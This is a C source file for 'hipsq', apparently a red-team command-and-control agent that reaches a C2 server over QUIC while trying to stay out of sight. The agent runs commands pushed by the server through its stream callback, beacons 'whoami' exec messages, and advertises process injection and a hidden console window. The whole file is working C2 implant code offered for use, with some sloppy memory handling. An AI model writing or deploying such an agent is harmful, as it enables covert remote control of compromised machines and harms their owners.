/* [H]iding [I]n [P]lain [S]ight with [Q]uic
*  agent.c
*  hipsq agent implementation
*
* Copyright 2024 Srdjan Rajcevic [www.sectreme.com]
* Parts of code Copyright (c) Microsoft Corporation.
*
* Permission is hereby granted, free of charge, to any person obtaining a copy of this software and 
* associated documentation files (the “Software”), to deal in the Software without restriction, including 
* without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell 
* copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the 
* following conditions:
*
* The above copyright notice and this permission notice shall be included in all copies or substantial 
* portions of the Software.
*
* THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT 
* LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO 
* EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER 
* IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR 
* THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
#pragma comment(lib, "Ws2_32.lib")

#include "hipsq.h"
#include "proto.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <winsock.h>
#include <ctype.h>

const uint16_t DefaultServerPort = 4443;
const uint64_t IdleTimeOutMs = 60000;
const uint32_t SendBufferLength = 100;
const QUIC_API_TABLE *msQuic;
const QUIC_REGISTRATION_CONFIG RegConfig = { "hipsq_agent", QUIC_EXECUTION_PROFILE_LOW_LATENCY };
const QUIC_BUFFER Alpn = { sizeof("hipsq") - 1, (uint8_t*)"hipsq" };
HQUIC Registration, Configuration;
HANDLE thread;

void SprintUsage(_In_reads_(argc) _Null_terminated_ char* argv[])
{
    printf("\nhipsq agent - Hiding in plain sight with Quic.\n\n");
    printf("Usage:\n\n"); 
    printf(" %s <c2 server IP/hostname> [-p <server port>] -p <pid> [h]\n", argv[0]);
    printf(" c2 server IP/hostname: IP or hostname of the C2 server\n");
    printf(" -p <server port>: port of the C2 server (default: 4443)\n");
    printf(" -p <pid>: process ID to inject into\n");
    printf(" h: hide console window at startup\n");
}

BOOLEAN validateC2Server(char *server)
{
    WSADATA wsaData;
    int res = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (res != 0) {
        puts("WSAStartup failed");
        return FALSE;
    }
    PHOSTENT host = gethostbyname(server);
    if (host != NULL)
        return TRUE;

    return FALSE;
}

BOOLEAN parseArgs(int argc, char* argv[], char* server, uint16_t* serverPort)
{
    if (argc < 2)
        return FALSE;

    if (argv[1] != NULL && validateC2Server(argv[1]))
    { 
        if (argv[2] == NULL)
        {
                strncpy(server, argv[1], strlen(argv[1]));
                *serverPort = DefaultServerPort;
                return TRUE;
        }

        if (argv[2] != NULL && strncmp(argv[2], "-p", 2) == 0 && argv[3] != NULL)
        {
                strncpy(server, argv[1], strlen(argv[1]));
                *serverPort = atoi(argv[3]);
                return TRUE;
        }
    }
    return FALSE;
}
DWORD WINAPI agent(LPVOID lpParams)
{
    HQUIC Connection = (HQUIC)lpParams;
    QUIC_STATUS status;
    HQUIC Stream = NULL;

    if (QUIC_FAILED(status = msQuic->StreamOpen(Connection, QUIC_STREAM_OPEN_FLAG_NONE, StreamCB, NULL, &Stream))) {
        puts("StreamOpen failed");
        goto error;
    }
    if (QUIC_FAILED(status = msQuic->StreamStart(Stream, QUIC_STREAM_START_FLAG_NONE))) {
        puts("StreamStart failed");
        msQuic->StreamClose(Stream);
        goto error;
    }
    Send(Stream);
    msQuic->StreamShutdown(Stream, QUIC_STREAM_SHUTDOWN_FLAG_ABORT, 0);
    return 0;
    error:
    if (QUIC_FAILED(status)) {
        msQuic->ConnectionShutdown(Connection, QUIC_CONNECTION_SHUTDOWN_FLAG_NONE, 0);
    }
    return 1;
}

hipsq_msg* Receive(uint8_t* buffer, uint32_t length)
{

    hipsq_msg *msg = malloc(sizeof(buffer));
    if(unpack_raw(buffer, msg) != 1) {
        printf("Receive failed!\n");
    }

    return msg;
}
void Send(HQUIC Stream)
{
    
    // hipsq msg
    hipsq_msg msg;
    msg.proto_id = "hipsq";
    msg.payload_id = HIPSQ_PAYLOAD_ID_INIT;
    msg.payload = "test";
    msg.msg_size = sizeof(msg.msg_size) + sizeof(msg.payload_id) 
                    + strlen(msg.payload) + 1 + strlen(msg.proto_id) + 1;
    QUIC_STATUS status;
    size_t size;
    char* packed_msg = pack_raw(&msg, &size); 
    QUIC_BUFFER *SendBuffer = (QUIC_BUFFER*)malloc(sizeof(QUIC_BUFFER));
    SendBuffer->Length = (uint32_t)msg.msg_size;
    SendBuffer->Buffer = (uint8_t*)packed_msg;

    if (QUIC_FAILED(status = msQuic->StreamSend(Stream, SendBuffer, 1, QUIC_SEND_FLAG_NONE, SendBuffer))) {
        puts("StreamSend failed");
        free(packed_msg);
        msQuic->StreamShutdown(Stream, QUIC_STREAM_SHUTDOWN_FLAG_ABORT, 0);
    }
    Sleep(10000);
    for (int i=0; i<10; i++)
    {

        msg.payload_id = HIPSQ_PAYLOAD_ID_EXEC;
        msg.payload = "whoami";
        msg.msg_size = sizeof(msg.msg_size) + sizeof(msg.payload_id) 
                        + strlen(msg.payload) + 1 + strlen(msg.proto_id) + 1;
        packed_msg = pack_raw(&msg, &size); 
        SendBuffer = (QUIC_BUFFER*)malloc(sizeof(QUIC_BUFFER));
        SendBuffer->Length = (uint32_t)msg.msg_size;
        SendBuffer->Buffer = (uint8_t*)packed_msg;

        if (QUIC_FAILED(status = msQuic->StreamSend(Stream, SendBuffer, 1, QUIC_SEND_FLAG_NONE, SendBuffer))) {
            puts("StreamSend failed");
            free(packed_msg);
            msQuic->StreamShutdown(Stream, QUIC_STREAM_SHUTDOWN_FLAG_ABORT, 0);
        }
        Sleep(5000);
    }
    
}
_Function_class_(QUIC_STREAM_CALLBACK)
QUIC_STATUS QUIC_API
StreamCB(HQUIC Stream, void* Context, QUIC_STREAM_EVENT* Event)
{
    (void) Context;
    switch (Event->Type) {
        case QUIC_STREAM_EVENT_SEND_COMPLETE:
            printf("[str][%p] send complete.\n", Stream);
            free(Event->SEND_COMPLETE.ClientContext);
            break;
        case QUIC_STREAM_EVENT_RECEIVE:
            printf("[str][%p] received %d bytes.\n", Stream, (uint32_t)Event->RECEIVE.TotalBufferLength);
            hipsq_msg unpacked_msg;
            if(!unpack_raw((char*)Event->RECEIVE.Buffers->Buffer, &unpacked_msg)) {
                printf("[str][%p] unknown message\n", Stream);
                break; // drop non-hipsq message
            }
            else {
                switch(unpacked_msg.payload_id) {
                    case HIPSQ_PAYLOAD_ID_EXEC:
                        printf("[str][%p] exec: %s\n", Stream, unpacked_msg.payload);
                        if(!exec(unpacked_msg.payload)) {
                            printf("[str][%p] exec failed\n", Stream);
                        }
                        break;
                    default:
                        break;
                }
            }
            break;
        case QUIC_STREAM_EVENT_PEER_SEND_SHUTDOWN:
            printf("[str][%p] peer send shutdown.\n", Stream);
            break;
        case QUIC_STREAM_EVENT_PEER_SEND_ABORTED:
            printf("[str][%p] peer send aborted.\n", Stream);
            msQuic->StreamShutdown(Stream, QUIC_STREAM_SHUTDOWN_FLAG_ABORT, 0);
            break;
        case QUIC_STREAM_EVENT_SHUTDOWN_COMPLETE:
            printf("[str][%p] shutdown complete.\n", Stream);
            if (!Event->SHUTDOWN_COMPLETE.AppCloseInProgress)
            {
                msQuic->StreamClose(Stream);
            }
            break;
        default:
            break;
    }
    return QUIC_STATUS_SUCCESS;
}
_IRQL_requires_max_(DISPATCH_LEVEL) _Function_class_(QUIC_CONNECTION_CALLBACK)
QUIC_STATUS QUIC_API
ConnectionCB(HQUIC Connection, void* Context, QUIC_CONNECTION_EVENT* Event)
{
    (void) Context;
    switch (Event->Type)
    {
        case QUIC_CONNECTION_EVENT_CONNECTED:
            printf("[conn][%p] connected.\n", Connection);
            thread = CreateThread(NULL, 0, agent, Connection, 0, NULL);
            //WaitForSingleObject(thread, INFINITE);
            break;
        case QUIC_CONNECTION_EVENT_SHUTDOWN_COMPLETE:
            msQuic->ConnectionClose(Connection);
            printf("[conn][%p] shutdown complete.\n", Connection);
            break;
        case QUIC_CONNECTION_EVENT_SHUTDOWN_INITIATED_BY_TRANSPORT:
            if (Event->SHUTDOWN_INITIATED_BY_TRANSPORT.Status == QUIC_STATUS_CONNECTION_IDLE) {
                printf("[conn][%p] successfully shut down on idle.\n", Connection);
            } else {
                printf("[conn][%p] shut down by transport, 0x%x\n", Connection, Event->SHUTDOWN_INITIATED_BY_TRANSPORT.Status);
            }
            break;
        case QUIC_CONNECTION_EVENT_SHUTDOWN_INITIATED_BY_PEER:
            printf("[conn][%p] shut down by peer, 0x%llu\n", Connection, (unsigned long long)Event->SHUTDOWN_INITIATED_BY_PEER.ErrorCode);
            break;
        default:
            break;
    }
    return QUIC_STATUS_SUCCESS;
}

int main(int argc, char *argv[])
{
    char *server = malloc(256);
    memset(server, 0, 256);
    uint16_t serverPort;
    if (!parseArgs(argc, argv, server, &serverPort))
    {
        SprintUsage(argv);
        return 0;
    }

    QUIC_STATUS status = QUIC_STATUS_SUCCESS;

    if (QUIC_FAILED(status = MsQuicOpen2(&msQuic)))
    {
        puts("Failed to initialize MsQuic");
        goto error;
    }

    if (QUIC_FAILED(status = msQuic->RegistrationOpen(&RegConfig, &Registration)))
    {
        puts("Failed to open registration");
        goto error;
    }

    QUIC_SETTINGS Settings = {0};
    Settings.IdleTimeoutMs = IdleTimeOutMs;
    Settings.IsSet.IdleTimeoutMs = TRUE; 
    Settings.KeepAliveIntervalMs = 10000;
    Settings.IsSet.KeepAliveIntervalMs = TRUE;
    QUIC_CREDENTIAL_CONFIG CredConfig;
    memset(&CredConfig, 0, sizeof(CredConfig));
    CredConfig.Type = QUIC_CREDENTIAL_TYPE_NONE;
    CredConfig.Flags = QUIC_CREDENTIAL_FLAG_CLIENT;

    if (QUIC_FAILED(status = msQuic->ConfigurationOpen(Registration, &Alpn, 1, &Settings, sizeof(Settings), NULL, &Configuration))) {
        puts("Failed to open configuration");
        goto error;
    }
    if (QUIC_FAILED(status = msQuic->ConfigurationLoadCredential(Configuration, &CredConfig))) {
        puts("Failed to load credential");
        goto error;
    }

    HQUIC Connection = NULL;

    if (QUIC_FAILED(status = msQuic->ConnectionOpen(Registration, ConnectionCB, NULL, &Connection))) {
        puts("Failed to open connection");
        goto error;
    }

    printf("Connecting to %s:%d\n", server, serverPort);

    if (QUIC_FAILED(status = msQuic->ConnectionStart(Connection, Configuration, QUIC_ADDRESS_FAMILY_INET, server, serverPort))) {
        puts("Failed to start connection");
        goto error;
    }
    getchar();

    return 0;

    error:
    if (Connection)
        msQuic->ConnectionClose(Connection);
    if (msQuic != NULL) {
        if (Configuration != NULL) {
            msQuic->ConfigurationClose(Configuration);
        }
        if (Registration != NULL) {
            msQuic->RegistrationClose(Registration);
        }
    MsQuicClose(&msQuic);
    }
}